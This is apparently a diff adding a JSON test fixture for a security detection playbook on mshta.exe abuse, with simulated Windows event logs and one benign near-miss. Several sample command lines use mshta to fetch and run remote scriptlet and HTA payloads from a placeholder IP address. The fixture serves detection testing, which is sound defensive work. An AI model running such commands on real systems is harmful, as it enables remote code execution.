@@ -1,0 +1,63 @@
+{
+ "playbook": "signal_mshta_abuse",
+ "fires": [
+  {
+   "rule": "MSHTA Inline Script",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe javascript:a=GetObject(\"script:http://203.0.113.7/x.sct\").Exec();close();",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "MSHTA Remote URL",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://203.0.113.7/payload.hta",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "MSHTA About Protocol",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe \"about:<hta:application><script>moveTo(-999,-999)</script>\"",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "local HTA application",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe C:\\Program Files\\Vendor\\setup.hta",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
